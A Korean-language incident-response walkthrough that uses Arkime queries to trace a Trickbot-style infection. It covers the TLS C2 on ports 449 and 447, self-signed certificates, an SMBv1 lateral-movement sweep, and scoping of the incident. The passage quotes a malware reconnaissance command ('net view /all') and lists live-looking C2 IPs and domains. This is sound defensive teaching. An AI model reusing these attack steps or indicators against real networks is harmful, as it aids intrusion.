**목적:** HTTP 통신은 21:37:52에 끝났는데 데이터는 22:06:41까지 있습니다. 비밀번호까지 훔친 악성코드가 30분 동안 조용히 있었을까요? 이런 악성코드는 보통 **암호화된 채널(TLS)로 공격자와 계속 연결**을 유지합니다. 먼저 흔한 포트를 뺀 나머지를 봅니다.

**쿼리:**

```text
ip.src == 10.3.11.194 && ip.dst != 10.0.0.0/8 && port.dst != 80 && port.dst != 443 && port.dst != 53
```

| 조각 | 뜻 |
|---|---|
| `ip.src == 10.3.11.194` | 감염 PC가 시작한 연결 |
| `ip.dst != 10.0.0.0/8` | 목적지가 내부망이 **아닌 것**. `!=`는 "같지 않다". 외부로 나간 것만 남김 |
| `port.dst != 80 && port.dst != 443 && port.dst != 53` | 웹(80), HTTPS(443), DNS(53)는 빼고 |

**실제 결과 (SPI View → General):**

```text
Dst IP     190.214.13.2 (6)  224.0.0.252 (6)  203.176.135.102 (5)  185.14.31.98 (3)
           239.255.255.250 (3)  224.0.0.251 (2)  185.180.198.50 (1)
Protocols  tcp (15)  udp (11)  tls (9)  llmnr (6)  http (5)  ssdp (3)  mdns (2)
Src IP     10.3.11.194 (26)
```

**결과 읽기:**

**먼저 걸러낼 것: 멀티캐스트 주소.** `224.x.x.x`, `239.x.x.x`는 인터넷의 외부 서버가 아니라 **같은 네트워크 안에서 "모두에게" 외치는 주소**(멀티캐스트)입니다. `10.0.0.0/8`이 아니라서 걸러지지 않았을 뿐입니다.

| 주소 | 프로토콜 | 역할 |
|---|---|---|
| `224.0.0.252` | LLMNR | 이름 찾기 |
| `239.255.255.250` | SSDP | 프린터나 스마트 기기 찾기 |
| `224.0.0.251` | mDNS | 로컬 이름 찾기 |

전부 윈도우의 평소 잡음입니다. 다음부터는 쿼리에 `&& ip.dst != 224.0.0.0/4`를 붙이면 깔끔하게 빠집니다(`224.0.0.0/4`는 224~239로 시작하는 멀티캐스트 대역 전체).

**남는 것: 진짜 의심 대상**

- `203.176.135.102` (5): 이미 아는 HTTP 8082 C2
- **`190.214.13.2` (6)**, **`185.14.31.98` (3)**, **`185.180.198.50` (1)**: 새로 나온 외부 IP

그리고 Protocols에 **`tls (9)`**가 있습니다. **443이 아닌 포트에서 TLS(암호화) 통신이 9번** 있었다는 뜻입니다. 정상 HTTPS는 거의 항상 443을 쓰니까, 이게 찾던 **숨은 암호화 채널** 후보입니다. 6 + 3 = 9라서 190.214.13.2와 185.14.31.98일 가능성이 높습니다.

**티켓 기록:**

```text
[251117 2135, Analyst] Hunting outbound connections from 10.3.11.194 on non-standard ports - Found

[251117 2135, Analyst] Query: ip.src == 10.3.11.194 && ip.dst != 10.0.0.0/8 && port.dst != 80 && port.dst != 443 && port.dst != 53 -> 26 sessions.
Dst IP: 190.214.13.2 (6), 224.0.0.252 (6), 203.176.135.102 (5), 185.14.31.98 (3), 239.255.255.250 (3), 224.0.0.251 (2), 185.180.198.50 (1)
224.x / 239.x = LLMNR / SSDP / mDNS multicast (benign). 9 TLS sessions on non-standard ports to raw external IPs.
```

---

## 15단계 — 숨은 통신 찾기 2: TLS 인증서 { #certificates }

**목적:** 443 포트라도 정상처럼 위장할 수 있어서 **인증서**를 봐야 합니다.

**쿼리:**

```text
ip.src == 10.3.11.194 && protocols == tls
```

SPI View에서 **cert** 섹션(인증서) → **Load All**. 볼 것은 **Issuer**(누가 발급했나)와 **Subject**(누구 것인가)입니다. 정상 사이트는 `DigiCert`, `Let's Encrypt`, `Microsoft` 같은 기관이 발급합니다. 수상한 건 이런 모양입니다.

```text
Issuer ON:  Internet Widgits Pty Ltd    ← OpenSSL default left unchanged (self-signed)
Issuer CN:  example.com / localhost / random letters
Issuer = Subject                        ← signed by itself
```

**실제 결과:**

```text
Issuer CN    baltimore cybertrust root (73)  microsoft it tls ca 5 (49)  microsoft it tls ca 4 (13)  microsoft it tls ca 2 (9)
             ...  example.com (4)  ...  let's encrypt authority x3 (2)  ...  cpanel, inc. certification authority (1) ...
Issuer ON    Microsoft Corporation (82)  Baltimore (73)  Global Security (4)  Digital Signature Trust Co. (2)
             Internet Widgits Pty Ltd (2)  Let's Encrypt (2)  AddTrust AB (1)  COMODO CA Limited (1)  DigiCert Inc (1)  cPanel, Inc. (1)
Issuer Org Unit  CyberTrust (73)  Microsoft IT (73)  IT Department (4)  ...
Subject CN   microsoft it tls ca 5 (49)  licensing.md.mp.microsoft.com (47)  ...  example.com (4)  ...
             filmstore.xyz (1)  hakunamatatata.com (1)  helpforyourservice.com (1)  ...
Subject ON   Microsoft Corporation (82)  Microsoft (9)  Global Security (4)  Internet Widgits Pty Ltd (2)  ...
Subject Org Unit  Microsoft IT (73)  Microsoft Corporation (49)  DSP (5)  IT Department (4)  WSE (4)
```

!!! question "질문: Issuer CN, ON과 Subject CN, ON은 무엇인가요?"
    HTTPS 인증서는 **"이 서버는 진짜 ○○가 맞다"는 신분증**입니다. 신분증에 "누구 것인지"와 "누가 발급했는지"가 적혀 있듯이, 인증서에도 두 부분이 있습니다.

    - **Subject(주인)**: 이 인증서가 **누구 것인지**. 예: `www.bing.com`
    - **Issuer(발급자)**: 이 인증서를 **누가 확인하고 서명해 줬는지**. 예: `Microsoft IT TLS CA 5`

    각각 안에 이름 항목이 여러 개 있습니다.

    | 항목 | 뜻 | 예 |
    |---|---|---|
    | **CN** (Common Name) | 대표 이름. 웹사이트라면 보통 **도메인** | `www.bing.com` |
    | **ON** (Organization Name) | **회사·기관 이름**. 표준 이름은 `O`이고 Arkime가 `ON`으로 표시 | `Microsoft Corporation` |
    | **OU** (Organizational Unit) | 회사 안의 **부서 이름**. Arkime 화면의 `Org Unit` | `Microsoft IT` |

    ```text
    Subject CN  = name of the certificate owner (domain)   e.g. www.bing.com
    Subject ON  = owner's organisation                     e.g. Microsoft Corporation
    Issuer CN   = name of the issuer                       e.g. Microsoft IT TLS CA 5
    Issuer ON   = issuer's organisation                    e.g. Microsoft Corporation
    ```

    **인증서는 사슬(chain)로 이어져 있습니다.** 발급자도 또 다른 발급자에게 인증서를 받습니다.

    ```text
    [cert 3] Subject: Baltimore CyberTrust Root   Issuer: Baltimore CyberTrust Root  ← root, signs itself
         ↓ signs
    [cert 2] Subject: Microsoft IT TLS CA 5       Issuer: Baltimore CyberTrust Root  ← intermediate issuer
         ↓ signs
    [cert 1] Subject: www.bing.com                Issuer: Microsoft IT TLS CA 5      ← the actual website
    ```

    서버는 접속할 때 보통 **인증서 1과 2를 같이** 보냅니다. 루트(3)는 윈도우에 이미 들어 있어서 안 보냅니다. 그래서 위 결과에서 **`microsoft it tls ca 5`가 Issuer CN(49)에도, Subject CN(49)에도** 나옵니다. 인증서 1에서는 발급자로, 인증서 2에서는 주인으로 등장한 것입니다. 반면 `baltimore cybertrust root`는 Issuer에만 있고 Subject에는 없습니다. 루트 인증서 자체는 전송되지 않았기 때문입니다.

**결과 읽기 — 대부분은 정상, 어울리지 않는 것이 섞여 있음:**

`Microsoft`, `Baltimore CyberTrust`, `DigiCert`, `Let's Encrypt`가 많은 건 윈도우가 Microsoft 서버와 늘 통신하기 때문입니다. 그 사이에:

```text
Issuer/Subject CN:  example.com (4)
Issuer ON:          Global Security (4)       Issuer Org Unit: IT Department (4)
Issuer/Subject ON:  Internet Widgits Pty Ltd (2)
Subject CN:         filmstore.xyz (1)  hakunamatatata.com (1)  helpforyourservice.com (1)
```

- **`example.com`**은 문서에 예시로 쓰라고 **예약해 둔 도메인**입니다. 실제 서비스가 이 이름으로 정식 인증서를 받을 수는 없습니다. 회사 이름도 "Global Security / IT Department"처럼 그럴듯하지만 아무 의미 없는 이름입니다. 이 조합(`example.com` + `Global Security` + `IT Department`)은 **Trickbot C2 서버 인증서에서 자주 보고된 패턴**입니다(외부 조회 없이 분석가 지식으로 본 판단).
- **`Internet Widgits Pty Ltd`**는 OpenSSL로 인증서를 만들 때 **아무것도 안 바꾸고 엔터만 치면 들어가는 기본값**입니다. 정상 회사는 이렇게 두지 않습니다.
- **`hakunamatatata.com`, `filmstore.xyz`, `helpforyourservice.com`**은 회사 PC가 접속할 이유가 없어 보이는 이상한 도메인입니다.

!!! question "질문: 발급자와 주인이 똑같은지 어떻게 판별했나요?"
    솔직히 처음에는 **SPI View의 숫자를 보고 추론**했습니다.

    ```text
    Issuer CN:  example.com (4)              Subject CN:  example.com (4)
    Issuer ON:  Global Security (4)          Subject ON:  Global Security (4)
    Issuer OU:  IT Department (4)            Subject OU:  IT Department (4)
    Issuer ON:  Internet Widgits Pty Ltd (2) Subject ON:  Internet Widgits Pty Ltd (2)
    ```

    같은 이름이 Issuer와 Subject 양쪽에 **같은 개수로** 나와서 "스스로 서명한 인증서"로 본 것입니다.

    그런데 **이건 증거가 아닙니다.** 위의 사슬을 떠올려 보세요. `let's encrypt authority x3`도 Issuer(2)와 Subject(2)에 똑같이 나오는데, 이건 자체 서명이 아니라 **사슬 때문**입니다. 인증서 A의 발급자이면서 인증서 B의 주인인 것이죠. 그리고 SPI View는 **전체 개수만 셀 뿐, 어떤 값들이 같은 인증서 안에 있었는지는 알려 주지 않습니다.**

    진짜 자체 서명 인증서라면 **같은 인증서 하나 안에서** Issuer와 Subject가 같아야 합니다.

    ```text
    self-signed:   [one cert]  Subject: example.com  /  Issuer: example.com   ← equal inside one cert
    normal chain:  [cert A]    Subject: site         /  Issuer: CA X
                   [cert B]    Subject: CA X         /  Issuer: root          ← equal across two certs
    ```

    **직접 확인하는 방법:** 세션을 펼치면 TLS 부분에 **Certificate**가 있고, 서버가 보낸 인증서가 **한 장씩 따로** 나옵니다. 확인할 것은 두 가지입니다.

    1. **인증서가 몇 장인지**: 정상 사이트는 보통 2장 이상(사이트 + 중간 발급자). 자체 서명은 대개 **딱 1장**
    2. **그 한 장 안에서 Issuer와 Subject가 같은지**

    [16단계](#step-9)에서 이렇게 확인해서 확정했습니다. 그리고 Arkime가 인증서를 분석해서 태그를 자동으로 붙여 줍니다. 자체 서명이면 **`cert:self-signed`**, 정식 발급 기관이 서명했으면 **`cert:certificate-authority`**. 앞으로는 이 태그로 바로 검색할 수 있습니다.

    ```text
    tags == "cert:self-signed"
    ```

**티켓 기록:**

```text
[251117 2140, Analyst] Reviewing TLS certificates from 10.3.11.194 for self-signed / anomalous issuers - Found

[251117 2140, Analyst] Query: ip.src == 10.3.11.194 && protocols == tls -> SPI View cert. Mostly Microsoft / Baltimore / DigiCert / Let's Encrypt (benign).
Anomalous: Issuer & Subject CN example.com (4), O "Global Security" / OU "IT Department" (4); "Internet Widgits Pty Ltd" (2, OpenSSL default);
Subject CN filmstore.xyz, hakunamatatata.com, helpforyourservice.com (1 each).
```

---

## 16단계 — 의심 대상을 한 번에 시간 순서로 보기 { #step-9 }

**목적:** 14단계의 IP 3개와 15단계의 이상한 인증서를 **하나의 쿼리**로 묶어서 언제·어느 포트로·얼마나 통신했는지 봅니다.

**쿼리:**

```text
ip.src == 10.3.11.194 && (ip.dst == 190.214.13.2 || ip.dst == 185.14.31.98 || ip.dst == 185.180.198.50 || cert.issuer.cn == example.com || cert.issuer.on == "Internet Widgits Pty Ltd" || cert.subject.cn == [filmstore.xyz, hakunamatatata.com, helpforyourservice.com])
```

| 조각 | 뜻 |
|---|---|
| **괄호 `( … )`** | `&&`와 <code>&#124;&#124;</code>를 섞을 때 꼭 필요. 괄호가 없으면 Arkime가 "10.3.11.194이고 190.214.13.2" **또는** "아무 PC든 example.com 인증서"처럼 엉뚱하게 묶을 수 있음. 괄호로 "**10.3.11.194가 시작했고, 그리고 (안쪽 조건 중 하나라도 맞는 것)**"으로 확실하게 묶음 |
| `cert.issuer.cn` | 인증서 발급자 이름 |
| `cert.issuer.on` | 인증서 발급자 회사 |
| `cert.subject.cn` | 인증서 주인 이름 |
| `[a, b, c]` | "이 목록 중 아무거나". <code>cert.subject.cn == a &#124;&#124; cert.subject.cn == b &#124;&#124; …</code>를 짧게 쓴 것 |
| `"Internet Widgits Pty Ltd"` | 띄어쓰기가 있어서 따옴표로 감쌈 |

Sessions 탭 → **Start Time 오름차순** → Start Time, Dst IP, Dst Port, Packets, Bytes를 봅니다. 여기서 볼 것:

- **포트가 몇 번인지** (443? 447? 449?)
- **일정한 간격으로 반복되는지** (비콘)
- **바이트 크기가 비슷하게 반복되는지** (C2 채널이 "살아 있나?"만 확인하는 연결이면 크기가 작고 일정)

**실제 결과 (14개, 전부 10.3.11.194, 오름차순):**

```text
Start     Stop      Dst IP:Port            Packets  Databytes / Bytes      Tags / Info
21:31:58  21:31:59  45.148.120.153:443        68     58,642 / 62,330       cert:certificate-authority  Alt Name filmstore.xyz, cpanel.filmstore.xyz ...
21:31:59  21:33:10  51.254.164.244:443       107     55,744 / 61,538       cert:self-signed
21:32:07  21:33:16  190.214.13.2:449          32      6,077 / 7,821        tls
21:35:31  21:36:46  185.180.198.50:447         6          0 / 384          tcp only
21:35:53  21:38:14  185.14.31.98:447        1,666  2,049,123 / 2,139,108   cert:self-signed
21:35:55  21:39:37  190.214.13.2:449         136     20,428 / 27,788       tls
21:35:58  21:39:31  190.214.13.2:449         117     16,273 / 22,607       tls
21:37:01  21:39:57  190.214.13.2:449          48      5,193 / 7,801        tls
21:42:12  21:46:06  190.214.13.2:449          52      8,477 / 11,301       tls
21:42:13  21:43:19  185.14.31.98:447          35     22,737 / 24,643       cert:self-signed
21:42:17  21:46:06  190.214.13.2:449          43      5,626 / 7,964        tls
21:43:40  21:43:46  199.247.13.144:443       518    541,679 / 569,667      cert:certificate-authority  Alt Name hakunamatatata.com
21:43:51  21:43:52  209.97.130.197:443       243    268,148 / 281,286      cert:certificate-authority  Alt Name helpforyourservice.com
21:44:02  21:45:08  185.14.31.98:447         111    107,501 / 113,511      cert:self-signed
```

목록은 기본적으로 최신순일 수 있으니 Start Time 화살표 방향을 확인하세요. 마지막 세션은 21:46:06에 끝나고, 그 뒤 22:06까지 이 대상들과의 통신은 없습니다.

### 자체 서명 확정 (21:44:02 세션 상세) { #self-signed-confirmed }

```text
General   Src  Packets 29  Bytes 2,185    Databytes 607
          Dst  Packets 82  Bytes 111,326  Databytes 106,894
          Dst IP/Port 185.14.31.98 : 447 { RIPE }    Tags cert:self-signed
TLS       Version TLSv1.2
          Cipher  TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
          JA3  72a589da586844d7f0818ce684948eea
          JA3s e35df3e00ca4ef31d42b34bebaa2f86e
          JA4  t12i190700_d83cc789557e_16bbda4055b2
Certificate (only one)
          Serial 008be295cd71603289
          Not Before 2020/03/06 09:53:10 UTC   Not After 2021/03/06 09:53:10 UTC   Days Valid For 365
          Issuer Common example.com   Issuer Org Global Security   Issuer Org Unit IT Department
          Subject Common example.com  Subject Org Global Security  Subject Org Unit IT Department
```

- **인증서가 딱 한 장**이고, **그 한 장 안에서** 발급자와 주인이 완전히 같습니다 → 자체 서명 **확정**. Arkime의 `cert:self-signed` 태그도 같은 판단입니다.
- **Not Before가 2020/03/06**, 즉 감염 **5일 전에 만든 인증서**입니다. 공격용으로 서버를 새로 준비했다는 정황입니다.
- **Dst(서버 → PC) 111,326바이트, Src(PC → 서버) 2,185바이트** → **내려받기**가 확실합니다.
- **JA3**는 클라이언트가 TLS 연결을 시작할 때 보내는 설정(ClientHello)으로 만든 지문, **JA3S**는 서버 응답의 지문, **JA4**는 더 새로운 방식의 지문입니다. IOC로 기록하되, 윈도우 기본 API를 쓰는 악성코드는 정상 프로그램과 JA3가 같을 수 있다는 점을 같이 적습니다.

### 대상별 역할 판단 { #c2-roles }

**1. `190.214.13.2:449` = 주 C2 채널**

- **449**는 표준 서비스가 거의 쓰지 않는 포트입니다.
- 연결이 **3~4분씩 열려 있고** 데이터는 **수 KB로 작습니다.** 큰 파일을 주고받는 게 아니라 **"명령 있어?" "없어"** 하고 연결을 유지하는 모양입니다. C2의 전형입니다.
- 이 서버는 Arkime가 인증서 태그를 붙이지 못했습니다. 인증서를 확인하지 못한 경우라서, 판단 근거는 **포트, IP 직접 접속, 연결 패턴**입니다.

!!! info "비콘의 두 종류"
    샘플 티켓에는 "2:45 간격 비콘"처럼 **일정한 간격**을 적는 예가 있지만, 여기는 간격이 일정하지 않고 대신 **연결을 길게 유지**합니다. 비콘에는 두 종류가 있습니다.

    - **짧게 자주 접속:** N초·N분마다 접속, 간격이 일정 — 간격 계산으로 찾음
    - **길게 붙잡기:** 연결을 열어 두고 명령을 기다림, 시작 시간은 불규칙, 바이트는 작음

    190.214.13.2:449는 두 번째입니다. 티켓에는 "long-lived, low-byte sessions, no fixed beacon interval"처럼 씁니다.

**2. `185.14.31.98:447` = 다운로드 채널**

21:35:53에 **약 2MB**가 오갔습니다. 비밀번호 탈취(/81/)와 정찰(/90)이 이 **직후**(21:36:52~)에 시작됐습니다. 그래서 **기능 모듈(비밀번호 탈취, 정찰 등)을 이 채널로 내려받은 것**으로 추정할 수 있습니다. 21:44:02 세션은 위에서 본 대로 내려받기가 확실합니다.

**3. `185.180.198.50:447` = 죽은 C2 서버**

패킷 6개, **Databytes 0**입니다. 접속을 시도했는데 서버가 답하지 않았습니다(SYN만 재전송). 악성코드는 C2 주소를 여러 개 갖고 있다가 **안 되는 건 건너뛰고 다음 걸 시도**합니다. 통신은 실패했지만 **IOC로는 기록**해야 합니다. 그 서버가 나중에 살아날 수 있으니까요.

**4. 정식 인증서지만 수상한 443 연결 4개**

`filmstore.xyz`, `51.254.164.244`(자체 서명), `hakunamatatata.com`, `helpforyourservice.com`은 443 포트라서 겉보기엔 평범한 HTTPS입니다. 그런데 **감염 직후와 C2 활동 한가운데**에 나타나고, 회사 PC가 갈 이유가 없는 도메인입니다. 특히 21:43:40~51에 **570KB, 281KB를 연달아** 받았습니다. 암호화되어 있어서 **내용은 알 수 없음**으로 기록하고, 판단 근거는 "시점과 도메인"이라고 적습니다.

**전체 흐름 (HTTP + TLS):**

```text
21:31:58  45.148.120.153:443   filmstore.xyz (CA cert)              62 KB
21:31:59  51.254.164.244:443   self-signed                          61 KB
21:32:00  (HTTP) checkip.amazonaws.com
21:32:07  190.214.13.2:449     TLS                                   8 KB  ← first C2
21:35:31  185.180.198.50:447   failed (0 databytes)
21:35:53  185.14.31.98:447     self-signed (example.com)         ~2 MB    ← big download
21:35:55  190.214.13.2:449     TLS (held ~4 min)                    28 KB
21:35:58  190.214.13.2:449     TLS (held ~3.5 min)                  23 KB
21:36:45~ (HTTP) cursor.png / imgpaper.png downloads, /81/ /90 POSTs
21:37:01  190.214.13.2:449     TLS                                   8 KB
21:42:12  190.214.13.2:449     TLS (held ~4 min)                    11 KB
21:42:13  185.14.31.98:447     self-signed                          25 KB
21:42:17  190.214.13.2:449     TLS (held ~4 min)                     8 KB
21:43:40  199.247.13.144:443   hakunamatatata.com (CA cert)        570 KB
21:43:51  209.97.130.197:443   helpforyourservice.com (CA cert)    281 KB
21:44:02  185.14.31.98:447     self-signed                         111 KB
21:46:06  last connection closes → nothing until 22:06
```

**티켓 기록:**

```text
[251117 2150, Analyst] Building timeline of TLS sessions to suspicious IPs / certificates (C2 hunt) - Found
[251117 2155, Analyst] Verifying self-signed certificate on 185.14.31.98:447 - Found

[251117 2150, Analyst] (14 sessions as listed above)
C2 assessment: 190.214.13.2:449 = persistent C2 (long-lived low-byte sessions, no fixed interval, 21:32:07-21:46:06). 185.14.31.98:447 = module/payload download channel. 185.180.198.50:447 = C2 attempted, unreachable.

[251117 2155, Analyst] Session 200311 21:44:02 10.3.11.194:50136 -> 185.14.31.98:447 {RIPE}
TLSv1.2, JA3 72a589da586844d7f0818ce684948eea, JA3S e35df3e00ca4ef31d42b34bebaa2f86e
Certificate (single): Serial 008be295cd71603289, Not Before 2020/03/06 09:53:10 UTC, Not After 2021/03/06 (365 days)
Issuer = Subject: CN example.com, O Global Security, OU IT Department -> self-signed confirmed. Created 5 days before incident.
```

---

## 17단계 — 범위 확인 1: 측면 이동 { #step-10 }

**목적:** 지금까지는 10.3.11.194 한 대만 봤습니다. 티켓을 닫기 전에 감염 PC가 **내부의 다른 PC로 퍼지려 했는지** 확인합니다.

**쿼리:**

```text
ip.src == 10.3.11.194 && ip.dst == 10.3.11.0/24 && ip.dst != 10.3.11.3
```

| 조각 | 뜻 |
|---|---|
| `ip.dst == 10.3.11.0/24` | 내부망으로 간 연결 |
| `ip.dst != 10.3.11.3` | DC는 빼고(DC와는 원래 통신하니까) |

결과가 있으면 SPI View의 Dst IP와 Protocols를 봅니다. `smb`, `dcerpc`, `rdp`가 **다른 워크스테이션**으로 가 있으면 측면 이동 시도입니다. `.255`(브로드캐스트)뿐이거나 아무것도 없으면 측면 이동은 없는 것입니다.

**실제 결과 (20개):**

```text
Start     Proto  Src Port  Dst IP:Port          Packets  Databytes / Bytes  Info
21:23:00  udp    137       10.3.11.255:137         15       966 / 1,596
21:23:05  udp    138       10.3.11.255:138          1       201 / 243
21:27:02  udp    138       10.3.11.255:138          1       201 / 243
21:35:00  udp    138       10.3.11.255:138          1       201 / 243
21:36:19  udp    137       10.3.11.255:137         22     1,100 / 2,024
21:36:19  udp    138       10.3.11.255:138         21     3,654 / 4,536
21:36:47  tcp    49818     10.3.11.1:445            2         0 / 120     (listed twice)
21:36:47  tcp    49919     10.3.11.218:445          6         0 / 348
21:36:47  tcp    49921     10.3.11.218:445          5        51 / 345      smb
21:36:47  tcp    49923     10.3.11.218:445          5        51 / 345      smb
21:36:47  tcp    49925     10.3.11.119:445          6         0 / 348
21:36:47  tcp    49927     10.3.11.119:445          5        51 / 345      smb
21:36:47  tcp    49929     10.3.11.119:445          5        51 / 345      smb
21:36:47  tcp    49955     10.3.11.131:445          1         0 / 66
21:36:47  tcp    50078     10.3.11.254:445          1         0 / 66
21:37:17  tcp    50095     10.3.11.218:445          5        51 / 345      smb
21:37:17  tcp    50097     10.3.11.119:445          5        51 / 345      smb
21:47:02  udp    138       10.3.11.255:138          1       201 / 243
21:59:04  udp    138       10.3.11.255:138          1       201 / 243
```

### UDP 137/138 → 10.3.11.255: 대부분 정상 { #netbios }

`10.3.11.255`는 **브로드캐스트 주소**(같은 망 전체에 외치는 주소)이고, 137/138은 **NetBIOS**(윈도우가 이웃 PC 이름을 알리고 찾는 기능)입니다. 21:23, 21:27, 21:35, 21:47, 21:59에 **1패킷씩** 나간 건 윈도우의 정상 동작입니다.

그런데 **21:36:19~21:37:21에만 20개 넘게 몰려** 있습니다(137번 22개, 138번 21개). 12단계에서 /90 POST 안에 이런 내용이 있었습니다.

```text
/c net view /all
System error 6118 has occurred.
```

`net view`는 NetBIOS 브로드캐스트로 "주변에 어떤 PC가 있어?"라고 묻는 명령입니다. **악성코드가 net view를 실행한 흔적이 네트워크에도 그대로 찍힌 것**입니다. 응답을 못 받아서 6118 오류가 났고요. **호스트에서 본 증거(업로드 내용)와 네트워크 증거가 같은 시간에 맞아떨어지는** 좋은 예입니다.

### TCP 445 (SMB): 측면 이동 시도 { #smb-sweep }

**21:36:47, 같은 1초 안에** 445 포트로 여러 PC를 두드렸습니다.

```text
21:36:47  → 10.3.11.119:445   smb x2 + no data x1
21:36:47  → 10.3.11.218:445   smb x2 + no data x1
21:36:47  → 10.3.11.1:445     (gateway) 2 sessions, 0 bytes
21:36:47  → 10.3.11.254:445   1 packet, 0 bytes
21:36:47  → 10.3.11.131:445   1 packet, 0 bytes
21:37:17  → 10.3.11.119:445, 10.3.11.218:445   one more smb each
```

**왜 수상한가:**

- **445는 SMB(파일 공유)** 포트입니다. 워크스테이션끼리는 보통 파일 공유를 하지 않습니다. 파일 서버나 DC로 가는 게 정상입니다.
- **1초 안에 5개 주소를 연달아** 찔렀습니다. 사람이 하는 행동이 아니라 **스캔**입니다. Src Port도 49818 → 49919 → 49921 → … 처럼 줄줄이 이어져 있습니다.
- `.254`와 `.131`은 **1패킷(SYN)만 보내고 답이 없습니다.** 앞에서 본 적 없는 주소라서 **아마 존재하지 않는 PC**일 겁니다. 악성코드가 "있는지 없는지 모르니 일단 찔러 보는" 것입니다.
- 실제로 대답한 건 **다른 두 노트북(.119, .218)**입니다. 감염 PC가 **같은 망의 다른 PC로 퍼질 수 있는지 시험**한 것입니다.

**그런데 성공했을까?** SMB 세션들이 **5패킷, 데이터 51바이트**밖에 안 됩니다. 대략 이런 흐름입니다.

```text
SYN → SYN-ACK → ACK → (SMB negotiate request, 51 bytes) → connection closed
```

파일을 복사하거나 로그인한 흔적이라면 수 KB에서 수백 KB가 오갔을 겁니다. 그래서 **"시도는 했지만 성공 흔적은 없음"**으로 보입니다. 이것도 추론이라 세션을 열어서 확인합니다.

### SMB 세션 하나 열어 보기 { #smb-session }

21:37:17의 `10.3.11.194:50097 → 10.3.11.119:445` 세션. 볼 것은 두 가지입니다.

- **General의 Src / Dst Databytes**: 51바이트가 어느 쪽에서 나갔는지, .119가 데이터를 돌려줬는지
- **SMB 섹션**(있다면): `Share`(접근한 공유 폴더), `User`(로그인 계정), `Filename` 같은 값이 있는지

**실제 결과:**

```text
Dst           Packets 2  Bytes 120  Databytes 0
Src Ethernet  b8:ca:3a:ec:3b:8f  Dell Inc.
Dst Ethernet  10:98:36:59:9d:cc  Dell Inc.
Src IP/Port   10.3.11.194 : 50097
Dst IP/Port   10.3.11.119 : 445
Payload8      Src 0000002fff534d42 ( /.SMB )
TCP Flags     SYN 1  SYN-ACK 1  ACK 1  PSH 1  RST 1  FIN 0  URG 0

Source (10.3.11.194:50097)
/.SMBr...
NT LM 0.12
```

**결과 읽기:**

- 감염 PC가 보낸 51바이트는 **SMB 접속 요청(Negotiate Protocol Request)**입니다. `\xffSMB` 뒤의 `r`(0x72)이 협상 명령이고, 제안한 버전이 **`NT LM 0.12` 하나뿐**입니다. 이건 아주 오래된 **SMB 버전 1(SMBv1)**의 이름입니다.
- .119는 **데이터를 하나도 돌려주지 않고**(Dst Databytes 0) Dst 패킷 2개(SYN-ACK + RST)로 연결을 끊었습니다. **대상 PC에서 SMBv1이 꺼져 있어서 거절**한 것입니다(윈도우 10은 기본으로 SMBv1 비활성).
- SMBv1만 골라서 찔러 보는 건 **EternalBlue(MS17-010) 같은 웜 방식 확산 시도**에서 흔히 보이는 모습입니다([EternalBlue / SMBv1](../../adversary/eternalblue-smbv1.md)).
- 공유 폴더, 계정, 파일 접근 흔적이 **전혀 없어서** **"시도했지만 실패"로 확정**합니다.

**티켓 기록:**

```text
[251117 2205, Analyst] Checking for lateral movement from 10.3.11.194 to other internal hosts - Found
[251117 2210, Analyst] Verifying outcome of SMB probe to 10.3.11.119:445 - Not Found (no successful lateral movement)

[251117 2205, Analyst] Query: ip.src == 10.3.11.194 && ip.dst == 10.3.11.0/24 && ip.dst != 10.3.11.3 -> 20 sessions.
UDP 137/138 -> 10.3.11.255 normal singles + burst 21:36:19-21:37:21 (= "net view /all" seen in /90 exfil).
TCP 445 sweep at 21:36:47 (sequential src ports 49818-49929) to 10.3.11.119, .218 (smb, 51 databytes), .1, .131, .254 (no response); again 21:37:17 to .119/.218.

[251117 2210, Analyst] Session 21:37:17 10.3.11.194:50097 -> 10.3.11.119:445. TCP SYN 1 SYN-ACK 1 ACK 1 PSH 1 RST 1.
Src payload SMBv1 Negotiate Protocol Request, dialect "NT LM 0.12" only. Dst 2 pkts, 0 databytes (SYN-ACK + RST).
SMBv1 probe refused (SMBv1 disabled). No share/user/file. EternalBlue-style probing. Lateral movement NOT successful.
```

---

## 18단계 — 범위 확인 2: 다른 PC도 같은 서버와 통신했나? { #other-victims }

**목적:** 다른 PC도 감염됐는지 확인합니다. 특히 SMB 시도를 받은 .119와 .218이 **나중에 악성 IP로 통신했다면 측면 이동이 성공해서 감염된 것**입니다.

**쿼리:**

```text
ip.dst == [50.87.248.17, 64.44.133.131, 203.176.135.102, 190.214.13.2, 185.14.31.98, 185.180.198.50, 51.254.164.244, 45.148.120.153, 199.247.13.144, 209.97.130.197] && ip.src != 10.3.11.194
```

| 조각 | 뜻 |
|---|---|
| `ip.dst == [...]` | 지금까지 찾은 **악성 IP 10개 중 아무거나**로 간 연결 |
| `ip.src != 10.3.11.194` | 그런데 출발지가 감염 PC가 **아닌 것** |

**실제 결과:** **0개.**

**결과 읽기:** 다른 PC는 아무도 악성 IP와 통신하지 않았습니다. 감염 PC는 **10.3.11.194 한 대로 확정**입니다. .119와 .218은 네트워크 데이터상 감염 흔적이 없습니다. 결과가 1개라도 나왔다면 그 PC도 조사 대상이었을 것입니다.

**티켓 기록:**

```text
[251117 2212, Analyst] Checking whether any other internal host contacted the external IOCs - Not Found

[251117 2212, Analyst] Query: ip.dst == [<10 IOC IPs>] && ip.src != 10.3.11.194 -> 0 sessions.
No other internal host contacted the external IOCs. 10.3.11.119 and 10.3.11.218 show no sign of infection in network data.
```

---

## 전체 결론 { #conclusion }

감염된 PC는 **LAPTOP-7XMV2SN (10.3.11.194, otis.witherspoon)** 한 대입니다.

```text
script fetches YAS20.exe (21:24:36)
  → public IP check (21:32:00)
  → TLS C2 on 449, module download on 447 (21:32-21:46)
  → credentials + recon sent in cleartext over HTTP 8082 (21:36:52-21:38:49)
  → SMBv1 sweep of the subnet, refused (21:36:47, 21:37:17)
  → no other host involved
```

## 타임라인 { #timeline }

| UTC (2020-03-11) | 이벤트 |
|---|---|
| 21:22:35 | 캡처 시작 |
| 21:24:36 | 스크립트(`WinHttp.WinHttpRequest.5`)가 bolton-tech[.]com에서 `YAS20.exe` 다운로드 |
| 21:31:58–59 | filmstore[.]xyz, 51.254.164.244(자체 서명)로 TLS |
| 21:32:00 | 공인 IP 확인, checkip.amazonaws[.]com |
| 21:32:07 | 190.214.13.2:449로 첫 TLS C2 |
| 21:35:31 | 185.180.198.50:447로 C2 시도 — 응답 없음 |
| 21:35:53 | 185.14.31.98:447에서 2.1MB 다운로드 |
| 21:36:19–21:37:21 | NetBIOS 몰림(`net view`) |
